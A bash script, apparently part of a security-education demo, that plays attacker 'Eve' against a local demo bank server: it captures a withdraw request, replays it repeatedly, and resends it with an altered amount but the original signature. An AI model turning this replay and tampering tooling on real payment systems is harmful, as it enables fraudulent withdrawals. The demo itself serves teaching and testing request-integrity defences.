#!/usr/bin/env bash
set -euo pipefail

HOST="localhost:3000"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PAYLOAD_FILE="$SCRIPT_DIR/payload.json"
CAPTURE_FILE="/tmp/eve-captured.json"
TAMPERED_FILE="/tmp/eve-tampered.json"

usage() {
  cat <<EOF
Usage:
  bash attack/attack.sh
  bash attack/attack.sh --capture
  bash attack/attack.sh --replay [count]
  bash attack/attack.sh --tamper-amount AMOUNT
EOF
}

require_jq() {
  if ! command -v jq >/dev/null 2>&1; then
    echo "[EVE] Abort: jq is required in Eve's shell."
    exit 1
  fi
}

json_state() {
  local file="$1"
  if [[ ! -f "$file" ]]; then
    echo "__missing__"
    return
  fi

  if command -v sha256sum >/dev/null 2>&1; then
    sha256sum "$file" | awk '{print $1}'
    return
  fi

  cksum "$file"
}

validate_json_file() {
  local file="$1"
  if [[ ! -f "$file" ]]; then
    echo "[EVE] Abort: payload file does not exist: $file"
    return 1
  fi

  if ! jq -e . "$file" >/dev/null 2>&1; then
    echo "[EVE] Abort: payload file is not valid JSON: $file"
    return 1
  fi
}

print_refresh_hint() {
  echo "[EVE] Refresh path: reset demo, make a successful 1000 BDT withdraw in the Bank UI, then rerun this script."
  echo "[EVE] The bank server syncs that exact accepted request into attack/payload.json."
}

payload_age() {
  local file="$1"
  local payload_timestamp payload_epoch now_epoch

  payload_timestamp="$(jq -r '.timestamp // empty' "$file")"
  if [[ -z "$payload_timestamp" ]]; then
    echo "[EVE] Abort: payload timestamp is missing."
    print_refresh_hint
    return 1
  fi

  payload_epoch="$(date -u -d "$payload_timestamp" +%s 2>/dev/null || true)"
  if [[ -z "$payload_epoch" ]]; then
    payload_epoch="$(node -e "const ms = Date.parse(process.argv[1]); if (Number.isNaN(ms)) process.exit(1); console.log(Math.floor(ms / 1000));" "$payload_timestamp" 2>/dev/null || true)"
  fi

  if [[ -z "$payload_epoch" ]]; then
    echo "[EVE] Abort: payload timestamp could not be parsed."
    print_refresh_hint
    return 1
  fi

  now_epoch="$(date -u +%s)"
  echo $((now_epoch - payload_epoch))
}

send_payload() {
  local file="$1"
  local count="$2"
  local age

  require_jq
  validate_json_file "$file"
  age="$(payload_age "$file")"

  echo "[EVE] Starting Replay Attack on $HOST..."
  echo "[EVE] Payload: $file"
  echo "[EVE] Payload age: ${age}s"

  for ((i = 1; i <= count; i++)); do
    echo "[EVE] Replay attempt #$i..."
    curl -s -X POST "http://$HOST/api/withdraw" \
      -H "Content-Type: application/json" \
      -d "@$file" | jq .
    sleep 1
  done
}

captured_source() {
  if [[ -f "$CAPTURE_FILE" ]]; then
    echo "$CAPTURE_FILE"
    return
  fi

  echo "$PAYLOAD_FILE"
}

capture_mode() {
  require_jq

  echo "[EVE] Waiting for Anis's next withdraw..."
  echo "[EVE] Monitoring captured request..."

  local previous_state current_state
  previous_state="$(json_state "$PAYLOAD_FILE")"

  trap 'echo; echo "[EVE] Capture watcher interrupted."; exit 130' INT

  while true; do
    sleep 1
    current_state="$(json_state "$PAYLOAD_FILE")"

    if [[ "$current_state" == "$previous_state" ]]; then
      continue
    fi

    previous_state="$current_state"

    if ! validate_json_file "$PAYLOAD_FILE"; then
      echo "[EVE] Waiting for the next valid synchronized payload..."
      continue
    fi

    cp "$PAYLOAD_FILE" "$CAPTURE_FILE"

    echo "[EVE] ============================================"
    echo "[EVE] NEW WITHDRAW PACKET CAPTURED"
    echo "[EVE] ============================================"
    jq -r '
      "[EVE] method: " + (.method | tostring),
      "[EVE] path: " + (.path | tostring),
      "[EVE] user_id: " + (.user_id | tostring),
      "[EVE] amount: " + (.amount | tostring),
      "[EVE] timestamp: " + (.timestamp | tostring),
      "[EVE] nonce: " + (.nonce | tostring),
      "[EVE] request_id: " + (.request_id | tostring),
      "[EVE] signature: " + (.signature | tostring)
    ' "$CAPTURE_FILE"
    echo "[EVE] Exact captured request saved to $CAPTURE_FILE"
    return
  done
}

replay_mode() {
  local count="${1:-1}"
  local source

  if ! [[ "$count" =~ ^[1-9][0-9]*$ ]]; then
    echo "[EVE] Abort: replay count must be a positive integer."
    exit 1
  fi

  source="$(captured_source)"
  if [[ "$source" == "$CAPTURE_FILE" ]]; then
    echo "[EVE] Using attacker-side captured request: $source"
  else
    echo "[EVE] No attacker-side capture found at $CAPTURE_FILE."
    echo "[EVE] Falling back to synchronized payload: $source"
  fi

  send_payload "$source" "$count"
}

tamper_amount_mode() {
  local new_amount="$1"
  local source original_amount signature

  require_jq

  if ! [[ "$new_amount" =~ ^[1-9][0-9]*$ ]]; then
    echo "[EVE] Abort: tampered amount must be a positive integer."
    exit 1
  fi

  source="$(captured_source)"
  validate_json_file "$source"

  original_amount="$(jq -r '.amount // empty' "$source")"
  signature="$(jq -r '.signature // empty' "$source")"
  jq --argjson amount "$new_amount" '.amount = $amount' "$source" > "$TAMPERED_FILE"

  echo "[EVE] ============================================"
  echo "[EVE] TAMPERING WITH CAPTURED PACKET"
  echo "[EVE] ============================================"
  echo "[EVE] Source payload: $source"
  echo "[EVE] Original amount: $original_amount"
  echo "[EVE] Modified amount: $new_amount"
  echo "[EVE] Signature: UNCHANGED"
  echo "[EVE] Preserved signature: $signature"
  echo "[EVE] Sending modified packet..."

  curl -s -X POST "http://$HOST/api/withdraw" \
    -H "Content-Type: application/json" \
    -d "@$TAMPERED_FILE" | jq .
}

case "${1:-}" in
  "")
    send_payload "$PAYLOAD_FILE" 10
    ;;
  "--capture")
    capture_mode
    ;;
  "--replay")
    replay_mode "${2:-1}"
    ;;
  "--tamper-amount")
    if [[ $# -ne 2 ]]; then
      usage
      exit 1
    fi
    tamper_amount_mode "$2"
    ;;
  "--help"|"-h")
    usage
    ;;
  *)
    usage
    exit 1
    ;;
esac
